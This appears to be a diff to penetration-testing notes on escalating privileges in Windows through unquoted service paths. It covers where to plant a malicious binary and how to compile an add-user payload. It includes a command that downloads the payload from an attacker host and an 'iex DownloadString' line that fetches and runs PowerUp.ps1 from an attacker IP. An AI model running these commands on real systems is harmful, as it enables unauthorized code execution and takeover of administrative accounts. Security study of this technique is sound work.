@@ -3,13 +3,16 @@
 
 #The UnquotedServicePath hijack is a Windows PrivEsc vector in which we leverage a malconfiguration Windows feature related to unquoted binpath strings. 
 
-#The OS, in order to init a service must run the executable binary associated with it. If the binpath var, that stores the path to the service's binary, doesn't have quotes the system would interpret the string as a command with arguments delimitated by spaces.
+#The OS, in order to init a service must run the executable binary associated with it. If the binpath var, that stores the path to the service's binary, 
+# oesn't have quotes the system would interpret the string as a command with arguments delimitated by spaces.
 
-#This means that if we have the following var:
-
-#	binPath=C:\Program Files\My Program\My service\service.exe
-
-#The system will try to execute the following executables: C:\Program.exe, C:\Program FIles\My.exe and finally C:\Program Files\My Program\My service\service.exe. So if we could store in one of those locations our malicious payload, we could have at the restart of the service, code execution through an adminstrative account resulting in a privilege escalation.
+# For example: 
+## VULNERABLE PATH: C:\Program Files\My Program\My Service\service.exe
+## WRITEABLE PATH BY YOUR USER: C:\Program Files\My Program\
+## You need to name your malicious binary as --> My.exe, place it in C:\Program Files\My Program\ and then Restart-Service because the way that Windows performs the binary search is:
+## 1.- C:\Program.exe
+## 2.- C:\Program Files\My.exe
+## 3.- C:\Program Files\My Program\My.exe --> When Windows find My.exe in this search, it will execute our malicious binary instead of the legit one service.exe.
 
 ######################################################################
 #### icacls permissions mask ####
@@ -56,14 +59,7 @@ x86_64-w64-mingw32-gcc adduser.c -o <SERVICE>.exe
 #Transfer file
 iwr -uri http://<ATTACKER_IP>/<SERVICE>.exe -Outfile <PATHFILE>.exe 
 
-NOTE: as the vulnerable unquoted path checks gradually the path using the rest of ir as arguments, You should use a binary name that is part of the path you can write to. 
-# For example: 
-## VULNERABLE PATH: C:\Enterprise Software\Monitoring Solution\Surveillance Apps\ReynhSurveillance.exe
-## WRITEABLE PATH BY YOUR USER: C:\Enterprise Software\Monitoring Solution\
-## You need to name your malicious binary as --> Surveillance.exe, place it in C:\Enterprise Software\Monitoring Solution\ and then Restart-Service because the way that Windows performs the binary search is:
-## 1.- C:\Enterprise.exe
-## 2.- C:\Enterprise Software\Monitoring.exe
-## 3.- C:\Enterprise Software\Monitoring Solution\Surveillance.exe --> When Windows find Surveillance.exe in this search, it will execute our malicious binary instead of the legit one ReynhSurveillance.exe.
+#NOTE: as the vulnerable unquoted path checks gradually the path using the rest of ir as arguments, You should use a binary name that is part of the path you can write to. 
 
 #PowerUp's Invoke-Allchecks cmdlet displays Unquoted Path services.
 iex (New-Object Net.WebClient).DownloadString('http://IP_ATTACKER/PowerUp.ps1')
